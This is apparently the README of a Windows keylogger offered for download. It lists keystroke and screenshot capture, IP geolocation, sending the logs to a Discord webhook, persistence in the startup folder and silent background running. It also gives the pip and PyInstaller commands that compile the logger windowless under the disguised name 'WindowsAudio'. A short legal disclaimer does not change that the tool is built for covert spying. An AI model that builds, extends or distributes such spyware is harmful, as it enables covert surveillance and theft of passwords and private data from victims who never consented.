# Keylogger
Keylogger for any windows
🔍 Features
✅ Keystroke Logging – Captures all typed keys with timestamps
✅ Discord Webhook Support – Automatically sends logs to a Discord channel
✅ Auto Screenshot Capture – Takes periodic screenshots (configurable interval)
✅ IP & Location Tracking – Logs approximate geolocation via IP address
✅ Persistence – Installs itself in %APPDATA% and adds to Windows startup
✅ Hidden Execution – Runs silently in the background (no console window)
✅ Error Logging – Saves crashes/errors locally for debugging

⚙️ Installation & Usage
Requirements
Python 3.8+

Windows OS (tested on Win10/11

pip install pyautogui geocoder pillow requests pynput pyinstaller

pyinstaller --onefile --windowed --icon=NONE --name=WindowsAudio --add-data="geocoder/data;geocoder/data" keylogger.py

python keylogger.py  # Or run the compiled .exe

🚨 Legal & Ethical Disclaimer
This tool is ONLY intended for:

Security research

Penetration testing (with permission)

Monitoring your own devices

Educational demonstrations

🚫 DO NOT USE THIS TOOL MALICIOUSLY. Unauthorized monitoring violates:

Computer Fraud and Abuse Act (CFAA) (US)

General Data Protection Regulation (GDPR) (EU)

Various anti-spyware laws worldwide

The developer is not responsible for any misuse.

📜 License
This project is licensed under MIT License – free for educational use, but strictly prohibited for illegal activities.




